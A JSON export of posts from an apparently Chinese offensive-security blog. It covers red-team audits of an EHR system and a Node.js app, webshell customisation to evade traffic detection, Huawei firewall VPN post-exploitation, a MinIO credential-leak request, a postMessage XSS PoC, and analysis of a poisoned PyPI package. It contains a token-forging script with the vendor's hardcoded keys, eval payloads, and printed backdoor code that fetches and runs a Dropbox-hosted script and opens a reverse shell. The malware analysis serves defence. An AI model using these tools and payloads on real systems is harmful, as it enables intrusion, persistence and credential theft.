{"posts":[{"title":"Java审计 | 某EHR系统从Auth绕过到RCE","content":"0x00 准备工作 水一个演练遇到的某个EHR系统的审计过程，首先获得系统的所有路由信息 批量跑接口，分出来鉴权接口和未鉴权接口 后面看代码，发现参数都加密了，然后找到有个加密的方法，后面截图的代码默认都被我还原过了 如下 def Kayang(s): # 初始化字符数组 cArr = [''] * len(s) length = len(s) - 1 i = length i2 = length # 初始化 c 值 c = ((2 ^ 5) &lt;&lt; 4) ^ (2 ^ 5) while i &gt;= 0: c2 = i2 c3 = (c2 ^ c) &amp; 0x3F # 0x3F 是 '?' 的 ASCII 值 cArr[c2] = chr(ord(s[i2]) ^ c) i3 = i2 - 1 if i3 &lt; 0: break c = (i3 ^ c3) &amp; 0x3F cArr[i3] = chr(ord(s[i3]) ^ c3) i2 = i3 - 1 i = i2 # 将字符数组转换为字符串 return ''.join(cArr) input_str = &quot;~EyXQ_\\\u0012&quot; output_str = Kayang(input_str) print(&quot;Input:&quot;, input_str) print(&quot;Output:&quot;, output_str) 0x01 审计过程 任意文件读取 除去springMvc的路由，再看一下web.xml，看看有没有直接定义路径的路由，看到了个资源文件的，进去看看 然后这里很明显有个path参数有问题 一个../的慢慢加上去，获得任意跨目录读文件漏洞，虽然实际作用不大，不过这说明其他洞存在概率高。。 任意用户登录 在未鉴权接口中一眼没看到什么大概率直接getshell的，所以去看包含sso字样的接口，在LoginxSSOController类中实现了LoginSSO路由 onload当前类中没有，再去当前类继承的BaseAction类去看看 找到了onLoad方法，然后再跳到onPageLoad方法，这个父类中也没实现代码 又回到LoginxSSOController类看到了onPageLoad的实现代码，发现1个关键参数account，有个解密操作，然后到达autoLogin方法，可知当前url为/LoginxSSO.json?account=密文，最终传入到autoLogin(url,account,false) 找到加密过程，直接调用或者ai帮你还原个python调用 from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad from Crypto.Random import get_random_bytes import binascii class EncryptAndDecodeUtil: # 静态变量 Kayang = bytes([ 106, 105, 194, 29, 184, 80, 227, 145, 124, 35, 34, 166, 60, 126, 106, 195, 193, 187, 69, 21, 59, 62, 24, 208, 173, 142, 21, 118, 103, 95, 77, 198 ]) B = bytes([ 202, 18, 194, 223, 133, 237, 32, 62, 249, 153, 18, 24, 67, 30, 191, 234 ]) @staticmethod def encode(content: str) -&gt; str: if not content: return &quot;&quot; # 使用 AES 加密 cipher = AES.new(EncryptAndDecodeUtil.Kayang, AES.MODE_CBC, EncryptAndDecodeUtil.B) padded_data = pad(content.encode('utf-8'), AES.block_size) encrypted_data = cipher.encrypt(padded_data) return binascii.hexlify(encrypted_data).decode('utf-8') @staticmethod def decode(content: str) -&gt; str: if not content: return &quot;&quot; try: # 使用 AES 解密 cipher = AES.new(EncryptAndDecodeUtil.Kayang, AES.MODE_CBC, EncryptAndDecodeUtil.B) encrypted_data = binascii.unhexlify(content) decrypted_data = cipher.decrypt(encrypted_data) unpadded_data = unpad(decrypted_data, AES.block_size) return unpadded_data.decode('utf-8') except Exception as e: try: # 如果 AES 解密失败，尝试 DES 解密 return EncryptAndDecodeUtil.decodeDES(binascii.unhexlify(content), &quot;T_E^UYYO\\u0007&quot;) except Exception: # 如果 DES 解密失败，尝试使用默认密钥 return EncryptAndDecodeUtil.decodeDES(binascii.unhexlify(content), &quot;kayangv9&quot;) @staticmethod def decodeDES(data: bytes, key: str) -&gt; str: try: # 使用 DES 解密 from Crypto.Cipher import DES key_bytes = key.encode('utf-8') cipher = DES.new(key_bytes, DES.MODE_ECB) decrypted_data = cipher.decrypt(data) return decrypted_data.decode('utf-8').rstrip('\\0') except Exception as e: print(f&quot;Error in decodeDES: {e}&quot;) return &quot;&quot; @staticmethod def encodeDES(content: str, key: str) -&gt; str: if not content: return &quot;&quot; try: # 使用 DES 加密 from Crypto.Cipher import DES key_bytes = key.encode('utf-8') cipher = DES.new(key_bytes, DES.MODE_ECB) padded_data = pad(content.encode('utf-8'), DES.block_size) encrypted_data = cipher.encrypt(padded_data) return binascii.hexlify(encrypted_data).decode('utf-8') except Exception as e: print(f&quot;Error in encodeDES: {e}&quot;) return &quot;&quot; # 测试代码 if __name__ == &quot;__main__&quot;: # 测试 encode 和 decode encod_text = &quot;ttt&quot; encoded_text = EncryptAndDecodeUtil.encode(encod_text) print(f&quot;Encoded: {encoded_text}&quot;) decode_text = &quot;fa32fda300eeb85fc0e3116ec9a0f191&quot; decoded_text = EncryptAndDecodeUtil.decode(decode_text) print(f&quot;Decoded: {decoded_text}&quot;) # 测试 encodeDES 和 decodeDES original_text = &quot;Hello, DES!&quot; encoded_text = EncryptAndDecodeUtil.encodeDES(original_text, &quot;kayangv9&quot;) print(f&quot;Encoded DES: {encoded_text}&quot;) decoded_text = EncryptAndDecodeUtil.decodeDES(binascii.unhexlify(encoded_text), &quot;kayangv9&quot;) print(f&quot;Decoded DES: {decoded_text}&quot;) 随便加密个ttt获得结果2972707ed0733287402a099e76285e7a 请求后提示账号不存在，有点东西哈 生成admin账号的，fa32fda300eeb85fc0e3116ec9a0f191，发现跳302 找个其他鉴权接口，测试下cookie，发现有效，这很好，后缀aspx可以忽略哈，随便选的后缀，是web.xml设置的走spingmvc认证的几个后缀之一，可能是为了让别人误判后端语言吧 没过鉴权是回显这个的 任意文件上传 找到这个洞的大概过程，在burp的api访问记录中从上到下看了一些路径可能包含上传功能的api，但没有找到能用的，一些原因如下 1.写死了后缀 2.还有的是检测时黑名单，但使用其他后缀名单会导致函数不返回true，导致函数不往下走 3.有一些会在调用文件上传前存在一些前置操作，导致方法停止运行 后续开始全局搜索fileOutputStream.write，去看看对应的文件，没找到 又搜FileUtils.copyFile( ，找到一个saveAs方法 通过对saveAs方法的调用，定位到了本次的接口，代码如下，刚好在检测后缀前他调用了内置上传方法，追溯上去发现后缀正好是传入的srcname参数控制，这样虽然无法完全运行完毕，但还是完成了上传步骤 同时缓存文件的uuid还会在异常信息中返回 完成闭环 0x02 结束 水文结束，不知道什么时候才能再次碰到资产用上洞 ","link":"https://www.svenbeast.com/post/7iSXkstGK7/"},{"title":"不上线你是这个👍","content":" ","link":"https://www.svenbeast.com/post/E0Bcu3tVli/"},{"title":"Java工具 | JMG添加自定义内存马","content":"0x01 原因 ​ 因为哥斯拉默认版本触发流量设备告警的几率较高，所以大部分场景都是使用二开过的哥斯拉及shell进行管理webshell，不过在一些java内存马注入的漏洞上面使用jmg生成内存马时还是会需要先使用默认版本哥斯拉shell再注入二开版本的哥斯拉shell，增加告警风险，所以得把自己的shell加到jmg里直接生成。 0x02 添加JMG生成shell选项 1.jmg-gui模块 添加Filter_Image按钮 添加结果输出 2.jmg-core模块 添加Shell类型，起名SHELL_FILTER_IMAGE 添加生成逻辑 添加生成逻辑 3.jmg-godzilla 添加指向shell类的代码 新建个内存马类，类名和前面加的对应上，转换你用来bypass流量设备的jsp代码为Filter类型的java代码，我这里肯定是哥斯拉类型的shell咯，加密方法和解密方法照搬，其他也都是照搬过来，需要注意的是我这里当属性为null时，setAttribute属性的代码用原本的即可 0x03 添加完成 最终效果，帮助你内存马场景下防止使用普通哥斯拉shell触发流量检测设备的告警 ","link":"https://www.svenbeast.com/post/HDu5nl4VC/"},{"title":"Nodejs审计 | 某演练入口点的二次注入RCE","content":"0x01 背景 ​ 之前举行过的云资产的演练又开始了，目前拥有目标某设备的老版本前台RCE漏洞，但本次因某些原因不允许使用此漏洞，所以入口点需要重新找，准备找个新洞，记录nodejs审计过程如下 0x02 审计 1.前期过程 ​ 首先我的想法是寻找那种简单的命令注入漏洞，因为之前的洞就蛮简单的，我做了如下操作，目的是定位调用了命令执行函数的路由文件 grep -rl &quot;child_process&quot; --include=\\*.js . ​ 然后首先看的是ping功能，很简单的定义路由，接参，然后传入命令执行函数中，但发现存在正则过滤，由于正则我都是现记现忘，重新看了下，写死了\\d限制了其他字符，所以漏洞不存在 ​ 接着过了一遍筛选出来的所有存在命令注入函数的路由，没发现能用的，有的看着代码是存在漏洞但是当用在目标网站上是不存在漏洞的，推测是目标更新了版本进行修复漏洞（这里还没有去跟踪各个函数调用链深挖） ​ 随即又搜了下nodejs的文章知道了还可以寻找代码执行漏洞，也就是eval函数，eval参数可控时直接进行导入命令执行进行调用就行 http://localhost:3000/?abc=require('child_process').execSync('open -a Calculator.app', { encoding: 'utf8' }) ​ grep大法之故技重施，实际就有2个route文件存在eval，当然别的文件也是耗费精力看了但没东西，就不讲了，后续在反推eval函数代码执行的调用链中同时找到一个命令注入漏洞 grep -rl &quot;eval&quot; --include=\\*.js . 2.代码执行 ​ 然后就是发现的漏洞从eval函数反推调用链路及传参的伤脑细胞过程，调用链中较为重要的函数调用过程如下，函数里嵌套的其他一些函数就不写了 +-----------------------------------------------------------------+ | router.post('/generatorRuleMap', function (req, res) | +-----------------------------------------------------------------+ | V +-----------------------------------------------------------------+ | execGetNostructureNodeAndLinks(NodeSet, startTime, ... , cb) | +-----------------------------------------------------------------+ | V +-----------------------------------------------------------------+ | getRelationNodeandLinks(resultSet, relationMap, ... , cb) | +-----------------------------------------------------------------+ | V +-----------------------------------------------------------------+ | getNodevalueBynodeType(row, nodeType, regex, index, cb) | +-----------------------------------------------------------------+ | V +-----------------------------------------------------------------+ | getRegexPattern(srcMessage, pattern, index) | +-----------------------------------------------------------------+ 2.1 getRegexPattern() ​ 此为最终调用eval的函数，没有限制，直接将接收的参数传入eval函数，payload参数名为pattern 2.2 getNodevalueBynodeType() ​ 此函数为当nodeType!=1时进入目标函数，payload参数名为regex 2.3 getRelationNodeandLinks() ​ 此函数需要使relationMap!=1进入目标函数，payload参数名为relationMap.srcRegex，是键的值 2.4 execGetNostructureNodeAndLinks() ​ 此函数需要满足3个条件进入目标函数，payload参数名为relationShips =&gt; relation outPutFieldsArray.length &gt; 1 存在/usr/local/las/program/neo4j/structure.csv文件 fileSize != 0 2.5 router.post ​ 此函数需要满足5个条件才能进入目标函数 能够根据_id查出结果docs docrelation == 0 服务器为linux indexArray.length &gt; 0 获得相应的splitrelationsBystructure()函数返回 payload参数名依次变化如下，并且可知我们控制的参数是用来控制查询的id，而不是直接传入exp，所以还需要找到id对应的值是插入到数据库的过程 req.body._id //获得请求参数 ↓ s_id //对请求参数进行了过滤，防止出现sql注入 ↓ docs.relationships //查询结果的键 ↓ relations //查询结果的键 ↓ resultRelation.noStructure //经splitrelationsBystructure函数处理后返回的键 ↓ noStructureRelations //经splitrelationsBystructure函数处理后返回的键 2.5.1 splitrelationsBystructure() ​ payload参数为relationShips，若要将payload最终保存到noStructure键中，需满足以下条件 srcNodeType != 1 or dstNodeType != 1 ​ 并且通过这里的键调用，联动前面的payload传递过程，也得知了最终传入eval的参数为srcRegex，如果在下面这个函数中调用，就是relation.srcRegex，和srcNodeType这些是同级的，所以srcRegex和srcNodeType这些都是插入id对应的内容中的键名 2.5.2 通过前端定位添加关系规则功能 ​ 由于需要找到如何控制id查询结果，所以在网站上找到代码中对应的前端功能位置，此功能是生成关系规则图，然后在前端找到了对应的添加关系规则的功能，由于没保存具体图片，口述记录一下过程 ​ 然后在尝试新增关系模型时，发现提交对应的参数输入框被注释了，当时梳理的还没有那么清晰还是什么其他原因导致没在http中改包，是使用burp将返回&lt;!--注释符号注释和其他的一些返回包修改，让新增关系模型的功能重新在前端显示 ​ 获取到添加关系模型的路由和数据包后，定位到代码，确定无误，参数名都能对上，最后构造能够满足以上需要步入的目标函数的所有条件的参数值 2.6 漏洞利用 最终利用过程分为四步 1.添加关系规则 2.查询关系规则，获得ID 3.调用ID，触发payload 4.删除关系规则，否则会在数据库中留下很多数据 5.目标不出网通过写入文件执行命令结果进行命令回显 3.命令执行 3.1 generateToCsv() ​ 命令执行是在找代码执行跟踪调用链时发现的，这个函数就是在代码执行调用链那个execGetNostructureNodeAndLinks函数中调用的 ​ 传入到这里的参数跟踪后会发现是和代码执行中传入的payload是差不多的，通过审计发现只是传入的参数名改为了srcLogfield，利用过程就不写了，就是添加关系时payload改下参数 0x03 总结 ​ 整体就是类似于sql的二次注入的代码执行&amp;命令注入漏洞，先保存payload到数据库，在后面调用数据库数据时触发恶意代码。 ​ 看文章说nodejs的代码还可以尝试找原型链污染进行RCE，以后有需要再学，最后吐槽下公司给我们调薪了，高兴吧？是往下调！入职几年，年收入比入职时还低了，还低了，抵了，了...🤡 ​ 实际审计过程还有其他一些东西，大概如下 拿到权限发现是低权限用户，通过其他发现可利用漏洞直接变成root权限 请求必须携带对应目标host的Referer 记不清了。。 ","link":"https://www.svenbeast.com/post/b_Y7hJQKj/"},{"title":"Java点滴 | interface&implements","content":"0x01 Hello~（interface&amp;implements） ​ 在Java编程语言中，interface和implements两个关键字都跟面向对象编程的概念有密切的关系。下面是对它们的基础解释： interface：在Java中，接口（interface）是一种引用类型，跟类（class）是同级的结构。它是一种完全抽象的类型，用于定义对象之间的约定或行为规范。接口中可以定义抽象方法和常量，但不能包含普通方法（除非是Java 8之后引入的default方法和静态方法）。实质上，接口是对动作的抽象。 implements：这是一个关键字，用于类来&quot;实现&quot;一个或多个接口。当一个类实现了一个接口，就意味着这个类必须提供接口中所有抽象方法的具体实现。一个类可以实现多个接口，这就提供了一种对于Java单继承的补充机制。 以下是一个简单的接口和类的示例： interface Animal { void eat(); void sleep(); } class Dog implements Animal { @Override public void eat() { System.out.println(&quot;The dog eats.&quot;); } @Override public void sleep() { System.out.println(&quot;The dog sleeps.&quot;); } public void bark() { System.out.println(&quot;The dog barks.&quot;); } } ​ 在这个例子中，我们定义了一个名为Animal的接口，接口有两个方法：eat和sleep。然后，我们创建了一个类Dog，这个类通过使用关键字implements来实现了Animal接口。这就意味着Dog类必须提供Animal接口中所有方法的实现。 请注意，虽然Dog类必须实现所有的Animal接口的方法，但这并不意味着Dog类不能有Animal接口之外的其他方法。例如，Dog类可能还有其他方法，如 bark()： 在这个例子中，你能够在Dog对象上调用bark()方法： Dog myDog = new Dog(); myDog.bark(); // The dog barks. 但你不能在Animal对象上调用bark()方法，因为它不是Animal接口的一部分： Animal myAnimal = new Dog(); // This is allowed because Dog is a subtype of Animal. myAnimal.bark(); // This is NOT allowed. 在上述例子中，尽管myAnimal是一个Dog的实例，但是由于其类型被声明为Animal，我们只能调用在Animal接口中定义的方法。如果你需要调用bark()方法，就需要将对象类型转换成Dog: Animal myAnimal = new Dog(); // This is allowed because Dog is a subtype of Animal. ((Dog)myAnimal).bark(); // This would be allowed because we are casting myAnimal to Dog. 总体而言，使用interface和implements的关键目的是创建一个可以由多种类按照共享的规则进行实现的架构，这样通过使用多态性，就可以使我们的代码更加灵活和可扩展。 0x02 审计相关 那么实际在审计中这个基础知识又扮演着什么角色，这里用某个OA的漏洞触发点跟踪过程进行举例。 当你找到此漏洞路径关联的调用方法，onMessage() 然后你每次都利用idea进行command+鼠标左键进行跟踪，直到追溯到handleMessage()方法，发现，咦，怎么是空的 这个时候如果你知道interface&amp;implements的关系，那么你就会去找实现WorkspaceMessageHandler这个接口的类了，也知道为啥要搜implements WorkspaceMessageHandler了（快捷跳转见文尾）。 最终你成功找到了漏洞触发方法，而不是半路夭折。 PS: idea右键转到接口实现代码，快捷键option+command+B ","link":"https://www.svenbeast.com/post/5MkJJ8OB9/"},{"title":"Java打包 | 最优缩减jar包体积","content":"0x01 ​ 发现有人写了帆软的GUI放在github，试用后觉得很方便，遂下载后尝试将新的利用链添加进去，以方便后续自己测试用，但是将利用链的jar包依赖添加进去后，打包出来的jar包太大了，有200多mb，所以想缩减下 0x02 ​ 有人说一个一个看依赖然后去做适配，觉得不太现实，最后使用方法如下 修改依赖fine-third-10.0.jar为fine-third-10.0.zip 使用MacZip(mac的压缩工具，其他压缩工具不可以) 然后选中不需要的依赖去移除，实际删除一些没用到的大体积的文件夹就可以了 0x03 一开始记得以前弄过，就是改压缩包去缩减体积，具体记不清了。 靠模糊印象去尝试，先试解压后去删除没用的依赖在压缩，但是这样出来的jar包不能用，idea看着总是多一层路径 后来是解压删除依赖后，选择所有文件夹后右键压缩，不过这样的jar包虽然不多一层路径了，但也不能用 最终效果 简单实用，200多mb =&gt; 40mb，顺便标题改成自己的ID，哈哈哈，感谢yecp181的源码 ","link":"https://www.svenbeast.com/post/Zvdet8GNt/"},{"title":"后利用 | HUAWEI防火墙VPN隧道利用","content":"通过弱口令拿到华为防火墙的管理权限或其他场景拿到管理权限，后续如下 1.新建VPN 2.选择LNS类型，输入一些输入项，然后新建一个用户，记住这里设置的对端隧道名称，客户端连接时要用到 3.输入地址设置，这里的IP地址自由设置，只要不和此防火墙设备的IP在同一网段即可 4.安装HUAWEI SecoClient客户端进行连接 我是Mac，找了下资源，win的和mac的安装包都存在百度云了 链接: https://pan.baidu.com/s/1lb1RczQuvVWeP5Pr1TwuFQ 提取码: sven 5.输入设置的信息，LNS服务器地址就是防火墙IP地址，PAP模式，如果设置了隧道密码就启用隧道验证功能，这里我设置了，所以开启，隧道名称填刚才新建隧道的对端隧道名称，如果不对应是连不上的 6.使用设置的用户密码进行登录，连接成功，这时连接后当前电脑也就无法上网了 7.经测试，修改连接配置为允许连接后联网，并设置好内网IP段(在防火墙路由表或其他配置中可看到相关内网网段)，这样就可以通内网资产了，不这样设置我这里会导致ping任意网段都是通的（实际使用时，需自行测试是否需要此步骤） ","link":"https://www.svenbeast.com/post/khfIrl-fh/"},{"title":"MinIO未授权信息泄露（CVE-2023-28432）","content":"漏洞范围 RELEASE.2019-12-17T23-16-33Z &lt;= version &lt; MinIO RELEASE.2023-03-20T20-16-18Z minio环境 version: '3.7' # starts 4 docker containers running minio server instances. Each # minio server's web interface will be accessible on the host at port # 9001 through 9004. services: minio1: image: minio/minio:RELEASE.2023-01-31T02-24-19Z container_name: minio1 volumes: - data1-1:/data1 - data1-2:/data2 ports: - &quot;9001:9000&quot; environment: MINIO_ACCESS_KEY: minio MINIO_SECRET_KEY: minio123 command: server http://minio{1...4}/data{1...2} healthcheck: test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost:9000/minio/health/live&quot;] interval: 30s timeout: 20s retries: 3 minio2: image: minio/minio:RELEASE.2023-01-31T02-24-19Z container_name: minio2 volumes: - data2-1:/data1 - data2-2:/data2 ports: - &quot;9002:9000&quot; environment: MINIO_ACCESS_KEY: minio MINIO_SECRET_KEY: minio123 command: server http://minio{1...4}/data{1...2} healthcheck: test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost:9000/minio/health/live&quot;] interval: 30s timeout: 20s retries: 3 minio3: image: minio/minio:RELEASE.2023-01-31T02-24-19Z container_name: minio3 volumes: - data3-1:/data1 - data3-2:/data2 ports: - &quot;9003:9000&quot; environment: MINIO_ACCESS_KEY: minio MINIO_SECRET_KEY: minio123 command: server http://minio{1...4}/data{1...2} healthcheck: test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost:9000/minio/health/live&quot;] interval: 30s timeout: 20s retries: 3 minio4: image: minio/minio:RELEASE.2023-01-31T02-24-19Z container_name: minio4 volumes: - data4-1:/data1 - data4-2:/data2 ports: - &quot;9004:9000&quot; environment: MINIO_ACCESS_KEY: minio MINIO_SECRET_KEY: minio123 command: server http://minio{1...4}/data{1...2} healthcheck: test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost:9000/minio/health/live&quot;] interval: 30s timeout: 20s retries: 3 ## By default this config uses default local driver, ## For custom volumes replace with volume driver configuration. volumes: data1-1: data1-2: data2-1: data2-2: data3-1: data3-2: data4-1: data4-2: 启动环境 docker-compose -f docker-compose.yml up 获取凭据 POST /minio/bootstrap/v1/verify HTTP/1.1 Host: 192.168.0.113:9001 Content-Length: 0 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 Origin: http://127.0.0.1:9001 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://127.0.0.1:9001/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close PS：包含本次其他漏洞的联合利用还有待研究 ","link":"https://www.svenbeast.com/post/_sKzg-nS0/"},{"title":"XSS漏洞 | postMessage类型笔记","content":"0x01 postMessage是what? postMessage API 是在 HTML5 中引入的通信方法，可以在标签中实现跨域通信。 简单来说就是两个网页窗口进行通信的方法。 0x02 如何工作 A页面: 一个带有 接收postMessages通信的测试html网页 ==&gt; 相等于一个正常网站页面 &lt;!-- 假如这是一个正常系统的.html --&gt; &lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/head&gt; &lt;div id=&quot;receiveMessage&quot;&gt; Hello World! &lt;/div&gt; &lt;script&gt; var test = &quot;flag{123456}&quot;; window.onload = function() { window.addEventListener('message', function (e) { // 监听 message 事件 // alert(e.origin); document.getElementById('receiveMessage').innerHTML = &quot;从&quot;+ e.origin +&quot;收到消息： &quot; + e.data; }); } &lt;/script&gt; B页面: 一个带有 使用postMessages发送通信的测试html网页 ==&gt; 相等于一个攻击页面 &lt;!-- POC.html --&gt; &lt;title&gt;Postmessage PoC&lt;/title&gt; &lt;script&gt; function pocFrame(win) { let msg = &quot;hello world!&quot;; win.postMessage(msg, '*'); } &lt;/script&gt; &lt;iframe src=&quot;http://127.0.0.1:9000/listen.html&quot; onload=&quot;pocFrame(this.contentWindow)&quot;&gt;&lt;/iframe&gt; 正常的运行流程 A页面持续监听通信，当访问B页面的时候运行js代码，向A页面发送通信，A页面接受信息然后对接受内容进行处理 应用场景: 一个网站实时监听，另一个网页某项运行流程结束后发送进度通知到监听的网页，后续如何xxx... 0x03 如何变成漏洞 携带payload的poc.html &lt;!-- POC.html --&gt; &lt;title&gt;Postmessage PoC&lt;/title&gt; &lt;script&gt; function pocFrame(win) { let msg = &quot;hello world! &lt;img src=x onerror=alert(test)&gt;&quot;; win.postMessage(msg, '*'); } &lt;/script&gt; &lt;iframe src=&quot;http://127.0.0.1:9000/listen.html&quot; onload=&quot;pocFrame(this.contentWindow)&quot;&gt;&lt;/iframe&gt; 产生漏洞原因 消息接收方没有对发送方的身份进行验证，导致可以自定义发送方网页 例如: if (e.origin !== &quot;https://www.freebuf.com&quot;) 消息接收方对发送方发送的内容进行了展示处理，从而可以使用XSS payload进行截断 例如: document.getElementById('receiveMessage').innerHTML = &quot;从&quot;+ e.origin +&quot;收到消息： &quot; + e.data; 利用过程 和反射型xss类似，用户在访问目标网站的时候，打开了攻击者提供的url，url是携带xss payload的poc.html，导致在目标网站执行了js代码。 其他形式漏洞 上面展示的是接收方没有对发送身份验证，在对接收的消息进行处理后被xss payload截断导致存在xss漏洞 接收方是正常系统 =&gt; 发送方是恶意html 那么这样就还会有另外一种形式的漏洞，发送方没有设置接收方的身份，例如 xxx.postMessage(msg,'*'); *号代表对接收方的窗口没有限制，只要你设置了监听(addEventListener)都可以接收到，那么如果正常系统在发送的时候就是如此设置，而刚好发送内容是一些敏感的信息，如账号密码的hash，那么你通过设置了监听当做接收方的恶意html，用户浏览正常系统时，然后在打开你的html后你就可以获得其正常网站的发送内容 发送方是正常系统 =&gt; 接收方是恶意html 0x04 挖掘方法 通过postMessage方法的关键字进行定位功能点，通过debug代码寻找触发点，从而获得漏洞，可以使用burp的插件J2EEScan辅助寻找使用相应功能的js文件，如何扩展延伸的进行挖掘对于我来说是一个有待开发的过程，目前我本人对此漏洞的经验并不足以帮我找到更好的自动化挖掘办法ing， ","link":"https://www.svenbeast.com/post/o2xpyWshj/"},{"title":"针对\"红队人员\"的Github项目投毒发现及分析","content":"0x01 发现背景 &quot;阳康&quot;后在github闲逛时发现同事star了一个后处理免杀项目，看描述说可以绕过任何类型的防病毒产品，自然我也对项目产生了一些兴趣，遂开始查看项目代码并由此开启了本次的投毒项目分析。 PS：此前并未在其他渠道发现本次分析项目的预警 0x02 分析过程 2.1 项目地址 文章编写时项目还在正常运行，我将其保存在了快照网站，若后面项目删除方便继续查看 https://github.com/machine1337/pycrypt https://web.archive.org/web/20230103031922/https://github.com/machine1337/pycrypt 2.2 发现异常 项目的介绍较长且附带视频，整体并无异常，在查看代码准备了解实现原理时发现异常，其导入了一个异常的依赖库colourema，有一些PY代码编写基础的朋友应该知道修改终端颜色的依赖库叫做colorama，那么很明显这里可能存在一些问题 2.3 定位后门 在pypi的依赖库介绍中，colourema的介绍有3000+star,实际链接却为colorama，到此确定此依赖库存在后门。 通过对依赖库代码进行查看，因担心使用vscode存在一些风险，使用sublime打开，最后于initialise.py文件中发现后门代码 2.4 后门代码 2.4.1 一层加密 加密代码 解密后代码 import os,platform,subprocess if platform.system().startswith(&quot;Linux&quot;): try: with open('/tmp/file.py', 'w') as f: f.write(&quot;import os \\nimport subprocess \\nfrom pathlib import Path \\nfrom urllib import request \\nhello = os.getlogin() \\nPATH = '/home/' + hello + '/.msfdb/update'\\nPAT = '/tmp/file.py'\\nisExist = os.path.exists(PATH) \\nif not isExist:\\n os.makedirs(PATH) \\nif Path(PATH).is_file(): \\n print(&quot;&quot;) \\nelse: \\n&quot;) f.write(&quot; remote_url ='https://dl.dropboxusercontent.com/s/bpf0cfzf2h576o3/mozila.sh'\\n local_file = PATH+'/.path.sh' \\n request.urlretrieve(remote_url, local_file) \\n subprocess.call(\\&quot;bash /home/$USER/.msfdb/update/.path.sh &gt;/dev/null 2&gt;&amp;1\\&quot;, shell=True) \\n&quot;) f.write(&quot; if Path(PAT).is_file(): \\n try:\\n os.remove(PAT)\\n except:\\n print()&quot;) except FileNotFoundError: print(&quot;&quot;) subprocess.call(&quot;python3 /tmp/file.py &amp;&quot;, shell=True) 2.4.2 二层加密 上面代码下载并运行了此链接的sh文件，同样保存在了web.archive.org中，后续的相关文件也是如此，方便后续其他感兴趣的师傅复查 #sh文件中继续中转发现一层加密 https://dl.dropboxusercontent.com/s/bpf0cfzf2h576o3/mozila.sh #加密代码链接 https://dl.dropboxusercontent.com/s/n7xl8ki0k9xqt7x/update.py 加密代码 解密后代码 fpyepsdb = chr(105) zbieto = chr(109) + chr(112) + chr(111) + chr(114) + chr(116) + chr(32) + chr(98) + chr(97) ontxmpdwi = chr(115) + chr(101) + chr(54) + chr(52) + chr(59) + chr(101) + chr(120) + chr(101) rdnpqwkiz = chr(99) + chr(40) + chr(39) + chr(39) + chr(46) + chr(106) + chr(111) + chr(105) qvjlktvg = chr(110) + chr(40) + chr(91) + chr(121) + chr(91) + chr(48) + chr(93) + chr(32) nqsokf = chr(102) + chr(111) + chr(114) + chr(32) + chr(120) + chr(32) + chr(105) + chr(110) ... 同样是很长的一段加密字符串 ... qytpmsygab = &quot;&quot; qytpmsygab += fpyepsdb qytpmsygab+= zbieto + ontxmpdwi ... 同样是很长的一段加密字符串 ... qytpmsygab+= xpcexvz + yslqs exec(qytpmsygab) 2.4.3 三层加密 加密代码 上一步解密后代码中的那段很长的加密字符串 解密后代码 import base64; exec(''.join([y[0] for x in [x for x in base64.b64decode( ('同样是很长的一段加密字符串').encode('ascii') ).decode('ascii')] for y in [[x[0], x[1]] for x in {'\\t': '6', '\\n': 'R', ' ': 'U', '!': 'Y', '@': 'i', '~': 'n', '`': 'Q', '#': '7', '$': 'A', '%': 'E', '^': '$', '&amp;': 'o', '*': 'm', '(': '!', ')': '/', '_': '~', '=': 'L', '-': 'h', '+': ')', '{': 'N', '}': 'O', '|': '\\\\', '\\\\': 'g', '[': 'S', ']': '+', ':': 'z', ';': '|', '&quot;': 's', &quot;'&quot;: '`', ',': '{', '.': 'F', '/': ']', '?': '2', '&gt;': 'y', '&lt;': 'l', '0': '%', '1': 'W', '2': 'H', '3': 'c', '4': '\\n', '5': 'x', '6': 'Z', '7': '.', '8': '&gt;', '9': 'K', 'a': '&lt;', 'b': 'V', 'c': '(', 'd': 'B', 'e': ';', 'f': 'u', 'g': &quot;'&quot;, 'h': 'p', 'i': 'w', 'j': '3', 'k': '}', 'l': '1', 'm': 't', 'n': 'k', 'o': '9', 'p': '?', 'q': 'M', 'u': 'q', 'r': 'a', 's': '0', 't': '\\t', 'v': 'J', 'w': '=', 'x': 'T', 'y': '_', 'z': 'G', 'A': '[', 'B': '&amp;', 'C': '4', 'D': '-', 'E': '@', 'F': 'e', 'G': '^', 'H': 'f', 'I': '8', 'J': '*', 'K': 'D', 'L': '#', 'M': 'C', 'N': ' ', 'O': 'b', 'P': 'P', 'Q': 'X', 'U': ',', 'R': '&quot;', 'S': 'd', 'T': 'j', 'V': 'I', 'W': 'v', 'X': '5', 'Y': ':', 'Z': 'r'}.items()] if x == y[1]])) 2.4.4 四层加密 加密代码 上一步解密后代码中的那段很长的加密字符串 解密后代码 from cryptography.fernet import Fernet encrypted_message = '同样是很长的一段加密字符串' key = b'fFdnVFFLuGqYOndl9Xvp9pRnOenZ__grZS5sFssfiX4=' f = Fernet(key) decrypted_message = f.decrypt(encrypted_message.encode()) exec(decrypted_message.decode()) 2.4.5 五层加密 加密代码 上一步解密后代码中的那段很长的加密字符串 解密后代码 import codecs exec(codecs.decode(b'同样是很长的一段加密字符串', &quot;hex&quot;).decode()) 2.4.6 六层加密 加密代码 上一步解密后代码中的那段很长的加密字符串 解密后代码 import gzip code = b&quot;同样是很长的一段加密字符串&quot;.decode() exec(gzip.decompress(code.encode('cp437')).decode()) 2.4.7 七层加密 加密代码 解密后代码 import socket import json import subprocess import time import os import sys def reliable_send(data): jsondata = json.dumps(data) s.send(jsondata.encode()) def reliable_recv(): data = '' while True: try: data = data + s.recv(1024).decode().rstrip() return json.loads(data) except ValueError: continue def download_file(file_name): f = open(file_name, 'wb') 